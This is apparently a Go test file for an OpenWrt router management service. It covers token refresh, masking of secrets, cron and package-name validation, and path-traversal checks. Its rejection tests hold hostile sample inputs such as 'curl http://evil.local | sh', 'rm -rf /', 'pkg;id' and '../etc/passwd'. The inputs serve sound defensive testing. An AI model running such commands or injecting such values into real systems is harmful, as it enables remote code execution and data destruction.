package main

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	bbolt "go.etcd.io/bbolt"
)

func TestGDriveExtractFolderIDAndTokenCoalescing(t *testing.T) {
	if got := extractGDriveFolderID("https://drive.google.com/drive/folders/1AbCDef_234567890?usp=sharing"); got != "1AbCDef_234567890" {
		t.Fatalf("expected valid folder ID, got %q", got)
	}
	if got := extractGDriveFolderID("1AbCDef_234567890"); got != "1AbCDef_234567890" {
		t.Fatalf("expected bare folder ID accepted, got %q", got)
	}
	for _, bad := range []string{"", "not/a/folder", "bad!id#123", "short", "foo/bar/baz", "spaces in value"} {
		if got := extractGDriveFolderID(bad); got != "" {
			t.Fatalf("expected empty folder ID for %q, got %q", bad, got)
		}
	}

	if err := initSettingsDBAt(filepath.Join(t.TempDir(), "r3p.db")); err != nil {
		t.Fatalf("initSettingsDBAt failed: %v", err)
	}
	defer closeSettingsDB()

	origPG := gdrivePlaygroundRefreshEndpoint
	origOAuth := gdriveOAuthTokenEndpoint
	gdriveConfigLock.RLock()
	origCfg := currentGDriveCfg
	gdriveConfigLock.RUnlock()
	defer func() {
		gdrivePlaygroundRefreshEndpoint = origPG
		gdriveOAuthTokenEndpoint = origOAuth
		gdriveConfigLock.Lock()
		currentGDriveCfg = origCfg
		gdriveConfigLock.Unlock()
	}()

	var hitCount int32
	badServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&hitCount, 1)
		w.WriteHeader(http.StatusBadRequest)
		_, _ = w.Write([]byte(`{"error":"invalid_grant","error_description":"bad override"}`))
	}))
	defer badServer.Close()

	gdrivePlaygroundRefreshEndpoint = badServer.URL
	gdriveOAuthTokenEndpoint = badServer.URL

	// 1. Singleflight coalescing: already-refreshed valid token is reused when previousFailedToken differs
	gdriveConfigLock.Lock()
	currentGDriveCfg = GDriveSyncConfig{
		AccessToken:    "ya29.fresh_cached",
		RefreshToken:   "1//saved_refresh",
		ClientID:       "saved-client-id",
		ClientSecret:   "saved-client-secret",
		TokenExpiresAt: time.Now().Unix() + 1800,
	}
	gdriveConfigLock.Unlock()

	tok, err := refreshGDriveTokenWithPrevious("ya29.old_failed")
	if err != nil || tok != "ya29.fresh_cached" {
		t.Fatalf("expected coalesced fresh token ya29.fresh_cached, got tok=%q err=%v", tok, err)
	}
	if atomic.LoadInt32(&hitCount) != 0 {
		t.Fatalf("expected 0 HTTP hits during coalesced reuse, got %d", hitCount)
	}

	// 2. Override failure must NOT overwrite persisted credentials, while saving error diagnostic
	badRef := "1//bad_override"
	badCID := "bad-client"
	badCSec := "bad-secret"
	if _, err := refreshGDriveTokenWithOverride("", true, &badRef, &badCID, &badCSec); err == nil {
		t.Fatal("expected override refresh error")
	}
	gdriveConfigLock.RLock()
	gotCfg := currentGDriveCfg
	gdriveConfigLock.RUnlock()
	if gotCfg.RefreshToken != "1//saved_refresh" || gotCfg.ClientID != "saved-client-id" || gotCfg.ClientSecret != "saved-client-secret" {
		t.Fatalf("override failure must not overwrite saved credentials: %+v", gotCfg)
	}
	if !strings.Contains(gotCfg.LastRefreshError, "invalid_grant") {
		t.Fatalf("expected LastRefreshError populated, got %q", gotCfg.LastRefreshError)
	}
}

func TestUSBTraversalAndWirelessSavedSanitization(t *testing.T) {
	if _, err := validateDownloadDestination("/tmp", "../etc/passwd"); err == nil {
		t.Fatal("expected traversal path in download destination to be rejected")
	}

	sanitized := sanitizeSavedWifiList([]SavedWifiNetwork{
		{SSID: "Office5G", Band: "5GHz", Key: "supersecret", Encryption: "psk2"},
		{SSID: "OpenGuest", Band: "2.4GHz", Key: "", Encryption: "none"},
	})
	if len(sanitized) != 2 {
		t.Fatalf("expected 2 items, got %d", len(sanitized))
	}
	if sanitized[0].Key != "" || !sanitized[0].HasKey {
		t.Fatalf("expected key stripped and HasKey=true, got %+v", sanitized[0])
	}
	if sanitized[1].HasKey {
		t.Fatalf("expected HasKey=false for empty key, got %+v", sanitized[1])
	}
}

func TestAdblockNormalizeAndAtomicWrite(t *testing.T) {
	if got := normalizeDomain("https://Ads.Example.COM/tracker.js"); got != "ads.example.com" {
		t.Fatalf("expected ads.example.com, got %q", got)
	}
	for _, bad := range []string{"localhost", "notadomain", "-bad..example.com", "0.0.0.0 127.0.0.1"} {
		if got := normalizeDomain(bad); got != "" {
			t.Fatalf("expected empty normalized domain for %q, got %q", bad, got)
		}
	}

	tmpDir := t.TempDir()
	dst := filepath.Join(tmpDir, "r3p-adblock.conf")
	if err := atomicWriteFile(dst, []byte("address=/ads.example.com/0.0.0.0\n"), 0644); err != nil {
		t.Fatalf("atomicWriteFile initial write failed: %v", err)
	}
	if err := atomicWriteFile(dst, []byte("server=/ads.example.com/\n"), 0644); err != nil {
		t.Fatalf("atomicWriteFile overwrite failed: %v", err)
	}
	raw, err := os.ReadFile(dst)
	if err != nil || string(raw) != "server=/ads.example.com/\n" {
		t.Fatalf("unexpected file content %q err=%v", string(raw), err)
	}
	entries, err := os.ReadDir(tmpDir)
	if err != nil || len(entries) != 1 {
		t.Fatalf("expected clean single file after atomic write, got %d entries err=%v", len(entries), err)
	}
}

func TestUCIConfigMaskAndUnmask(t *testing.T) {
	existing := `config interface 'wan'
	option proto 'pppoe'
	option username 'user1'
	option password 'my_real_pppoe_pass'

config wifi-iface
	option device 'radio0'
	option ssid 'HomeWiFi'
	option key 'super_wifi_key'
	option secret ''
`
	masked := maskSensitiveUCIConfig(existing)
	if strings.Contains(masked, "my_real_pppoe_pass") || strings.Contains(masked, "super_wifi_key") {
		t.Fatalf("expected sensitive UCI values masked, got:\n%s", masked)
	}
	if !strings.Contains(masked, "option ssid 'HomeWiFi'") {
		t.Fatalf("expected non-sensitive option preserved, got:\n%s", masked)
	}
	if !strings.Contains(masked, "option secret ''") {
		t.Fatalf("expected empty secret preserved unmasked, got:\n%s", masked)
	}

	edited := strings.Replace(masked, "option ssid 'HomeWiFi'", "option ssid 'HomeWiFi-5G'", 1)
	unmasked := unmaskSensitiveUCIConfig(edited, existing)
	if !strings.Contains(unmasked, "option password 'my_real_pppoe_pass'") {
		t.Fatalf("expected named section password restored, got:\n%s", unmasked)
	}
	if !strings.Contains(unmasked, "option key 'super_wifi_key'") {
		t.Fatalf("expected unnamed section key restored, got:\n%s", unmasked)
	}
	if !strings.Contains(unmasked, "option ssid 'HomeWiFi-5G'") {
		t.Fatalf("expected non-sensitive edit preserved, got:\n%s", unmasked)
	}
}

func TestNativeDownloaderControlTaskWasComplete(t *testing.T) {
	tmpDir := t.TempDir()
	completeFile := filepath.Join(tmpDir, "done.bin")
	partialFile := filepath.Join(tmpDir, "partial.bin")
	if err := os.WriteFile(completeFile, []byte("ok"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(partialFile, []byte("half"), 0644); err != nil {
		t.Fatal(err)
	}

	mgr := &NativeDownloadManager{
		tasks: map[string]*NativeDownloadTask{
			"done1": {GID: "done1", Status: "complete", FilePath: completeFile},
			"err1":  {GID: "err1", Status: "error", FilePath: partialFile},
			"done2": {GID: "done2", Status: "complete", FilePath: completeFile},
		},
		cancels:    make(map[string]context.CancelFunc),
		configFile: filepath.Join(tmpDir, "downloads.json"),
	}

	// "cancel" on complete task removes entry from queue while preserving completed file
	if err := mgr.controlTask("done1", "cancel"); err != nil {
		t.Fatalf("cancel complete task failed: %v", err)
	}
	if _, err := os.Stat(completeFile); err != nil {
		t.Fatalf("expected completed file preserved on cancel, got err=%v", err)
	}

	// "cancel" on incomplete task deletes partial file
	if err := mgr.controlTask("err1", "cancel"); err != nil {
		t.Fatalf("cancel incomplete task failed: %v", err)
	}
	if _, err := os.Stat(partialFile); !os.IsNotExist(err) {
		t.Fatalf("expected partial file deleted on cancel, got err=%v", err)
	}

	// "remove" deletes both task and file even if complete
	if err := mgr.controlTask("done2", "remove"); err != nil {
		t.Fatalf("remove complete task failed: %v", err)
	}
	if _, err := os.Stat(completeFile); !os.IsNotExist(err) {
		t.Fatalf("expected completed file deleted on remove, got err=%v", err)
	}

	if err := mgr.controlTask("missing", "pause"); err == nil {
		t.Fatal("expected error for unknown task")
	}
}

func TestSettingsDBSnapshotImportAndTimestamp(t *testing.T) {
	if err := initSettingsDBAt(filepath.Join(t.TempDir(), "snap.db")); err != nil {
		t.Fatalf("initSettingsDBAt failed: %v", err)
	}
	defer closeSettingsDB()

	snap := `{
		"settings/adblock": {"enabled": true},
		"settings/auth_secret": {"password_hash": "must_be_ignored"},
		"collections/ai_quick_commands": [{"id":"q1"}]
	}`
	count, err := importPublicSettingsDBSnapshot([]byte("\xef\xbb\xbf" + snap))
	if err != nil {
		t.Fatalf("importPublicSettingsDBSnapshot failed: %v", err)
	}
	if count != 2 {
		t.Fatalf("expected 2 whitelisted keys imported, got %d", count)
	}
	if _, ok := settingsDBGetRaw(bucketSettings, "auth_secret"); ok {
		t.Fatal("expected non-whitelisted key settings/auth_secret to be rejected")
	}
	if raw, ok := settingsDBGetRaw(bucketSettings, "adblock"); !ok || !strings.Contains(string(raw), "true") {
		t.Fatalf("expected settings/adblock imported, got ok=%v raw=%s", ok, string(raw))
	}

	// Verify audit_logs entry key parses as RFC3339Nano
	var foundRFC3339Nano bool
	settingsDBMu.RLock()
	db := settingsDB
	settingsDBMu.RUnlock()
	_ = db.View(func(tx *bbolt.Tx) error {
		b := tx.Bucket([]byte(bucketAuditLogs))
		if b == nil {
			return nil
		}
		return b.ForEach(func(k, v []byte) error {
			if _, perr := time.Parse(time.RFC3339Nano, string(k)); perr == nil {
				foundRFC3339Nano = true
			}
			return nil
		})
	})
	if !foundRFC3339Nano {
		t.Fatal("expected snapshot_restore audit key in RFC3339Nano format")
	}
}

func TestSyncTelegramConfigToDownloader(t *testing.T) {
	dlMu.Lock()
	origCfg := dlConfig
	dlConfig.OutputDirectory = "/mnt/sda1/downloads"
	dlMu.Unlock()
	defer func() {
		dlMu.Lock()
		dlConfig = origCfg
		dlMu.Unlock()
	}()

	// Invalid traversal mount/subpath should not overwrite OutputDirectory, while syncing bot credentials
	syncTelegramConfigToDownloader("123456:TESTTOKEN", "987654", true, "/tmp", "../escape")

	dlMu.Lock()
	got := dlConfig
	dlMu.Unlock()
	if got.TelegramBotToken != "123456:TESTTOKEN" || got.TelegramAllowedChatId != "987654" || !got.TelegramEnabled {
		t.Fatalf("expected telegram credentials synced, got %+v", got)
	}
	if got.OutputDirectory != "/mnt/sda1/downloads" {
		t.Fatalf("expected invalid traversal destination not to overwrite OutputDirectory, got %q", got.OutputDirectory)
	}
}

func TestCronValidationAndErrorShapes(t *testing.T) {
	if !isValidCronField("1-15/2", 0, 59) || !isValidCronField("*/5", 0, 59) || !isValidCronField("1,3,5", 0, 59) {
		t.Fatal("expected valid cron fields accepted")
	}
	for _, bad := range []string{"60", "10-5", "*/0", "abc", "", "1,,2"} {
		if isValidCronField(bad, 0, 59) {
			t.Fatalf("expected invalid cron field %q rejected", bad)
		}
	}

	if !isValidCronSchedule("0 */4 * * *") {
		t.Fatal("expected valid 5-field cron schedule accepted")
	}
	for _, bad := range []string{"0 25 * * *", "* * * *", "0 * * * * # comment", "0 0 32 * *"} {
		if isValidCronSchedule(bad) {
			t.Fatalf("expected invalid cron schedule %q rejected", bad)
		}
	}

	for _, okCmd := range []string{"/etc/init.d/dnsmasq reload", "sync; echo 3 > /proc/sys/vm/drop_caches", "/usr/sbin/ntpd -q -p pool.ntp.org"} {
		if !isAllowedCronCommand(okCmd) {
			t.Fatalf("expected safe cron command %q allowed", okCmd)
		}
	}
	for _, badCmd := range []string{"/bin/sh -c id", "/usr/bin/foo; rm -rf /", "curl http://evil.local | sh", "/usr/bin/../etc/passwd", "echo hi # bad"} {
		if isAllowedCronCommand(badCmd) {
			t.Fatalf("expected dangerous cron command %q blocked", badCmd)
		}
	}

	// Verify handleServicesControl blocks self-stop with 400 and flattens error into a string (before requireOpenWrt)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/services/control", strings.NewReader(`{"service":"r3p-api","action":"stop"}`))
	rec := httptest.NewRecorder()
	handleServicesControl(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 on disallowed service, got %d body=%s", rec.Code, rec.Body.String())
	}
	var env map[string]interface{}
	if err := json.Unmarshal(rec.Body.Bytes(), &env); err != nil {
		t.Fatalf("invalid JSON response: %v", err)
	}
	if _, isStr := env["error"].(string); !isStr {
		t.Fatalf("expected flattened string error in response envelope, got %T (%v)", env["error"], env["error"])
	}
}

func TestIoTPkgSafetyAndIsLocalAIBaseURL(t *testing.T) {
	for _, localHost := range []string{"localhost", "127.0.0.1", "::1"} {
		if !isLocalBrokerHost(localHost) {
			t.Fatalf("expected %q to be detected as local broker host", localHost)
		}
	}
	for _, remoteHost := range []string{"192.0.2.10", "broker.hivemq.com"} {
		if isLocalBrokerHost(remoteHost) {
			t.Fatalf("expected %q NOT to be treated as local broker host", remoteHost)
		}
	}

	for _, okPkg := range []string{"htop", "luci-app-sqm", "mosquitto-client-ssl"} {
		if !isSafePkgName(okPkg) {
			t.Fatalf("expected package name %q allowed", okPkg)
		}
	}
	for _, badPkg := range []string{"--force-depends", "-pkg", "../foo", "pkg;id", ""} {
		if isSafePkgName(badPkg) {
			t.Fatalf("expected unsafe package name %q rejected", badPkg)
		}
	}

	if !isValidRepoFeedURL("https://downloads.openwrt.org/releases/24.10.0") {
		t.Fatal("expected HTTPS repo URL accepted")
	}
	if isValidRepoFeedURL("file:///etc/passwd") || isValidRepoFeedURL("http://example.com/bad url") {
		t.Fatal("expected unsafe repo URL rejected")
	}

	for _, localURL := range []string{"http://127.0.0.1:11434/v1", "http://localhost:8080/v1", "http://[::1]:11434/v1", "http://192.168.1.50:11434/v1"} {
		if !isLocalAIBaseURL(localURL) {
			t.Fatalf("expected %q treated as local AI URL", localURL)
		}
	}
	for _, nonLocal := range []string{"https://api.openai.com/v1", "http://169.254.169.254/latest", "http://8.8.8.8/v1"} {
		if isLocalAIBaseURL(nonLocal) {
			t.Fatalf("expected %q NOT treated as local AI URL", nonLocal)
		}
	}
}
